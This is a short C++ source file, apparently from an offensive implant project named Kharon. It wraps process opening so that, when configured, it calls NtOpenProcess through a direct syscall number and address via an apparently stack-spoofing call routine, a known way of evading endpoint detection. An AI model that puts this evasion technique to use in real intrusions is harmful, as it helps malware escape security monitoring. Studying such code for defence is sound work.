#include <Kharon.h>

auto DECLFN Process::Open(
    _In_ ULONG RightsAccess,
    _In_ BOOL  InheritHandle,
    _In_ ULONG ProcessID
) -> HANDLE {
    const UINT32 Flags    = Self->Config.Syscall;
    NTSTATUS     Status   = STATUS_UNSUCCESSFUL;
    HANDLE       Handle   = nullptr;
    CLIENT_ID    ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
    OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr) };

    if ( ! Flags ) return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );

    UPTR Address = SYS_ADDR( Sys::OpenProc );
    UPTR ssn     = SYS_SSN( Sys::OpenProc );

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
        (UPTR)&ObjAttr, (UPTR)&ClientID
    );

    Self->Usf->NtStatusToError( Status );

    return Handle;
}
